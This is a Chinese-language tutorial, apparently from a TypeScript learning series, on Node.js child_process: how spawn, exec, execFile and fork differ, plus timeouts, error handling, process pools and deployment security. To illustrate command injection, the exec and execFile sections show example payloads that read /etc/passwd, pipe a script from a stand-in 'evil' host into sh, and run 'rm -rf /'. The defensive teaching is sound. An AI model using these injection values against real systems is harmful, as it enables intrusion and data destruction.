Node.js 子进程与进程通信

本文属于《TypeScript 学习路线》第 55/74 篇
上一篇系列目录下一篇

Node.js 擅长处理大量并发 I/O，但遇到 CPU 密集计算或需要调用外部程序时，单进程模型就会成为瓶颈。本文从这一现实问题出发，梳理 child_process 提供的四个方法，讲清各自的适用场景、参数写法与常见陷阱。读完之后，你应该能够为一项任务选出合适的调用方式，并写出带超时、能正确回收、不会被用户输入注入命令的子进程代码。

为什么需要子进程

Node.js 的 JavaScript 执行是单线程的。一个耗时两秒的循环会阻塞事件循环，期间到达的请求只能排队等待。实际项目里，有三类需求必须离开主进程：

  • CPU 密集：图片压缩、加解密、大批量数据转换、复杂报表渲染。
  • 调用外部程序：ffmpeg、ImageMagick、系统命令，或团队已有的 Python 脚本。
  • 隔离崩溃：第三方二进制或不可信代码出错时，只让子进程退出，主服务继续运行。

child_process 模块正是为此设计的。它让当前进程创建操作系统级的子进程，并通过管道、标准输入输出或 IPC 通道交换数据。与同进程内开线程不同，子进程拥有独立的内存空间，任何一个崩掉都不会带走父进程。

可以对比当时仍处于实验阶段的 worker_threads（Node 10.5 起加入，需加 --experimental-worker 启动）：线程更轻，共享内存方便，适合纯 JavaScript 计算；子进程更通用，能执行任意可执行文件，隔离性也更强。Node 8 上则只有子进程这一条路。也需要说明，如果瓶颈只是同步 I/O，子进程帮不上忙，反而会增加进程切换与数据序列化的成本。

四个方法的分工

child_process 导出 spawn、exec、execFile、fork 四个方法，初学者最容易混用。它们的核心差异只有三点：是否经过 shell、输出如何返回、是否建立 IPC 通道。

方法 经过 shell 输出方式 IPC 典型用途
spawn 否 流式 可开启 长任务、大输出、实时日志
exec 是 缓冲字符串 否 短命令、需要管道与通配符
execFile 否 缓冲字符串 否 调用已知二进制并传参
fork 否 流式 默认开启 父子都是 Node，传结构化消息

选择顺序可以记成一句话：默认用 spawn；确实需要 shell 语法且输出不大时用 exec；调用已知二进制用 execFile；父子都是 Node 进程且要传对象时用 fork。下面逐一看它们的写法与边界。

spawn：流式执行的首选

spawn 是最底层也最通用的方法。它不经过 shell，直接以可执行文件加参数数组的方式启动进程，输出以流的形式交还给父进程。

第一个参数是可执行文件名，第二个是参数数组。参数里的空格不会被再次拆分，文件名带空格也安全，这一点与拼字符串有本质区别。stdio 的三个位置依次对应标准输入、标准输出、标准错误，取值可以是 pipe、inherit、ignore；如果只是想把子进程日志直接打到当前终端，用 inherit 可以省掉一次转发。

退出码为 0 表示成功；子进程被信号杀死时 code 为 null，真正的原因在 signal 里。判断结束要用 close 而不是 stdout 的 end，因为后者只说明某个流读完了，进程可能还在运行。child_process 还提供 spawnSync、execSync 等同步版本，它们在子进程结束前完全阻塞事件循环，只适合构建脚本、启动自检这类一次性场景，不要放进请求处理链路。下图概括了父子进程之间的通道关系。

exec：方便但危险的 shell 通道

exec 把命令交给系统的 shell 执行，所以支持管道、重定向、通配符和 &&，结果一次性缓冲成字符串通过回调返回。写起来最短，问题也最集中。

当请求参数是 ; cat /etc/passwd 或 $(curl http://evil/x.sh | sh) 时，整段命令就在服务器上执行了。这不是 Node 的漏洞，而是 shell 把用户输入当成了语法。另一个隐性限制是缓冲：exec 默认的 maxBuffer 为 200 KB，输出超过上限时子进程会被杀死并抛出错误，用它去读一个大日志文件必然失败。

修复方式有两条。第一，根本不需要 shell 时改用 execFile 或 spawn，把用户输入放进参数数组；第二，确实需要 shell 时，先对输入做白名单校验，例如只允许字母、数字与短横线，并显式设置合理的 maxBuffer 和 timeout。永远不要把“转义一下引号”当作防护手段，shell 的语法远比引号复杂。

execFile：调用已知二进制的安全写法

execFile 与 exec 一样把输出缓冲后交给回调，但跳过了 shell，直接执行文件并把参数数组原样传给操作系统。少了 shell 解释这一层，注入面就基本消失了。

这里即使 file 的取值是 a.jpg; rm -rf /，它也只是 identify 的一个普通参数，命令不会被执行。execFile 适合调用 ffmpeg、ImageMagick、git、python 这类已知路径、参数结构固定的程序；参数需要条件拼接时，用数组的 push 而不要回到字符串。

两个注意点：其一，它仍然会把全部输出放进内存，只适合输出量可控的命令；其二，它和 exec 一样不支持交互，需要边跑边读输出时请换回 spawn。在 Windows 上，.bat 与 .cmd 不能直接由 execFile 启动，需要 shell: true，此时又回到了 shell 解析，参数安全要重新评估。

fork：Node 进程间的 IPC

fork 是 spawn 的特例，专门用于启动另一个 Node 模块。它默认在父子之间建立 IPC 通道，双方用 send 发消息、用 message 事件收消息，消息按 JSON 序列化，可以直接传对象。

消息是异步的，send 返回 false 只表示通道缓冲区已满，不代表失败；需要确认送达时给 send 传回调。同一通道上的消息保持发送顺序，但父子各自的事件循环独立，收到消息时不要假设对方的内部状态。由于默认走 JSON 序列化，函数、undefined 和循环引用都无法完整传递，二进制数据最好先转成字符串或 Buffer 再封装。

生命周期上要记住：父进程退出不会自动杀死 fork 出来的子进程，反之亦然。父进程收到 SIGTERM 时应向所有子进程转发信号；子进程则可以监听 disconnect 事件，在通道断开后自行退出，避免留下孤儿。silent: true 让子进程的标准输出不直接继承父进程，便于统一收集日志。

超时与终止：别让子进程失控

外部程序可能卡死：网络请求不返回、等待一个永远不来的输入、死循环。没有超时的子进程会一直占着文件描述符和内存，最终拖垮服务。spawn 与 exec 都支持 timeout 与 killSignal 选项，但更稳妥的做法是自己控制两段式终止：先发 SIGTERM 给对方清理的机会，宽限期后再发 SIGKILL。

child.kill() 只是发送信号，返回布尔值表示信号是否发出，并不代表进程已经退出，真正的确认仍要等 exit。SIGKILL 无法被捕获，进程没有机会写日志或删临时文件，所以只能作为兜底。Windows 没有 POSIX 信号语义，SIGTERM 会直接终止进程；需要连同子进程树一起结束时，得调用 taskkill /PID <pid> /T /F。

如果子进程自己又拉起了孙进程，杀死直接子进程未必能结束整棵树。POSIX 上可以在创建时设置 detached: true，让它独立成组，再用负的进程号向整组发信号。代价是该子进程与父进程的终端脱离，标准输入输出需要自行接管。

关于僵尸进程：Node 运行时会通过 SIGCHLD 回收已退出的子进程，正常情况下不会长期残留。但如果父进程长时间执行同步代码，回收会被推迟，ps 中可能短暂看到 Z 状态；更常见的问题是父进程反复重启却没有终止旧子进程，导致孤儿越积越多。因此每个创建子进程的地方都应有配对的终止逻辑，并在进程退出钩子里统一清理。

错误处理：error、exit 与 close

三个事件的名字很像，含义却不同。error 表示子进程根本没跑起来，例如命令不存在（ENOENT）、没有执行权限（EACCES）；exit 表示进程本身结束，回调参数是退出码与信号；close 表示进程结束且所有标准流都已关闭。顺序上，启动失败时先 error 后 close，正常结束时先 exit 后 close。

error 事件如果没有监听器，会像未捕获异常一样让父进程崩溃，所以只要用了 spawn，就必须挂上它。清理临时文件、释放队列槽位这类收尾动作放在 close 而不是 exit，因为此时输出流已经读完，不会出现“文件删了但日志还在写”的竞态。

还有一个容易被忽略的错误源：子进程提前退出后继续向 child.stdin 写入，会触发 EPIPE。给 stdin 加一个空的 error 监听，或写入前检查 child.stdin.writable，可以避免这类噪音。exec 的回调错误对象上带有 code、killed、signal 字段，可以据此区分超时、被杀与普通非零退出。用回调风格的 exec 时不要再叠加事件监听，否则一次失败会被处理两遍。

进程池与并发控制

子进程不便宜：创建要复制页表、加载运行时，fork 一个 Node 进程还要重新初始化模块。如果每个 HTTP 请求都 fork 一次，流量一上来 CPU 全花在启动上，内存也会成倍增长。正确做法是把并发数量管起来。

这里有两个细节。队列本身要有长度上限，满了就直接返回“系统繁忙”，这比无限排队把内存吃光更可控；max 不宜等于核数，主进程还要处理网络与序列化，留一到两个核的余量通常更稳。

如果任务类型固定且启动开销大，可以维持一组常驻的 fork worker，父进程把任务编号后分发，收到结果再按编号回填对应的回调。注意一个 worker 同一时间只应处理一个任务，否则计算仍然会串行堆积。常驻 worker 还要考虑内存增长，处理若干任务后主动退出并由父进程补位，避免长时间运行后的泄漏累积。进程池的调度策略、共享端口与平滑重启属于 cluster 的话题，本文不展开。

部署与安全清单

把子进程放进生产环境，除了功能正确，还要守住几条底线。

第一是最小权限。服务用专用低权限账号运行，不要用 root；POSIX 上可以在 spawn 的选项里指定 uid 与 gid，让子进程以更低权限执行。子进程只需读某个目录时，就不要给它整个文件系统的写权限。

第二是环境变量。子进程默认完整继承 process.env，数据库密码、云平台密钥都会一并带过去。调用第三方脚本时显式传入白名单：

第三是路径与命令。始终使用绝对路径或受控的 PATH，cwd 明确指定，避免相对路径随启动目录漂移。任何来自外部的值都只能作为参数数组的元素，不能进入命令字符串。

第四是可观测性。子进程的 stdout 与 stderr 都要收集，打上任务编号与进程号前缀后汇入同一套日志系统；注意不少工具把进度信息写进 stderr，不能简单地把非空 stderr 当成失败。同时限制单条日志长度与总量，防止一个刷屏的程序撑爆磁盘。日志之外还应记录任务耗时与退出码，便于区分业务失败与环境问题。

最后是资源边界：timeout、maxBuffer、并发上限、输出大小限制，四者缺一不可。部署脚本里还应确认依赖的二进制存在且版本符合预期，启动时做一次自检，比运行到一半才发现 ffmpeg 不在 PATH 里要好得多。以容器方式部署时，要确认镜像内确实装了这些程序，并让子进程随主进程一起停止。

小结

子进程解决的是单进程模型覆盖不了的三件事：CPU 密集计算、调用外部程序、隔离不可信代码。spawn 以流式方式执行，是默认选择；exec 经过 shell，写起来短但必须假设输入不可信；execFile 跳过 shell，适合调用已知二进制；fork 在父子 Node 进程之间建立 IPC，适合传递结构化任务。

工程上真正容易出事的是边界而非语法：用户输入拼进命令、没有超时、没有回收、每次请求都新建进程。把参数数组、两段式终止、close 收尾、并发上限和环境变量白名单做成固定套路，子进程才会成为可靠的工具而不是隐患。
